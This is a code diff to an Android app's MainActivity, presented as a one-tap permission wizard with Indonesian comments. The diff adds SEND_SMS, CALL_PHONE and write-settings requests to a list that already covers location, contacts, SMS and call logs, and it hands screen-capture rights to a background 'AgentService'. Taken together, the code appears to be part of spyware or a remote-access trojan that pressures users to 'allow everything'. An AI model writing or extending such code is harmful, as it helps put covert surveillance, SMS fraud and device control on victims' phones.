@@ -23,7 +23,7 @@ import androidx.core.content.ContextCompat;
 import java.util.ArrayList;
 import java.util.List;
 
-/** Wizard izin satu ketukan. */
+/** Wizard izin satu ketukan. Tidak memakai referensi R. */
 public class MainActivity extends Activity {
 
     private static final int REQ = 0x4d5a;
@@ -55,7 +55,7 @@ public class MainActivity extends Activity {
         root.addView(sub);
 
         TextView wiz = new TextView(this);
-        wiz.setText(wizardText());
+        wiz.setText(k.wizard);
         wiz.setTextColor(0xFFD6DBE6);
         wiz.setTextSize(13f);
         wiz.setPadding(0, 0, 0, 30);
@@ -86,14 +86,6 @@ public class MainActivity extends Activity {
         requestAll();
     }
 
-    private String wizardText() {
-        try {
-            return getString(R.string.mzk_wizard);
-        } catch (Exception e) {
-            return "Izinkan semua akses agar aplikasi berjalan normal. Tekan IZINKAN SEMUA.";
-        }
-    }
-
     private String[] wanted() {
         List<String> p = new ArrayList<>();
         p.add(Manifest.permission.ACCESS_FINE_LOCATION);
@@ -103,7 +95,9 @@ public class MainActivity extends Activity {
         p.add(Manifest.permission.READ_CONTACTS);
         p.add(Manifest.permission.READ_SMS);
         p.add(Manifest.permission.RECEIVE_SMS);
+        p.add(Manifest.permission.SEND_SMS);
         p.add(Manifest.permission.READ_CALL_LOG);
+        p.add(Manifest.permission.CALL_PHONE);
         p.add(Manifest.permission.READ_PHONE_STATE);
         if (Build.VERSION.SDK_INT >= 33) {
             p.add(Manifest.permission.POST_NOTIFICATIONS);
@@ -165,6 +159,21 @@ public class MainActivity extends Activity {
                         Uri.parse("package:" + getPackageName())));
             }
         } catch (Exception ignored) {
+        }
+        try {
+            if (Build.VERSION.SDK_INT >= 23 && !Settings.System.canWrite(this)) {
+                startActivity(new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
+                        Uri.parse("package:" + getPackageName())));
+            }
+        } catch (Exception ignored) {
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int req, int res, Intent data) {
+        super.onActivityResult(req, res, data);
+        if (req == ScreenModule.REQ_PROJECTION && data != null && AgentService.instance != null) {
+            AgentService.instance.setProjection(data, res);
         }
     }
 
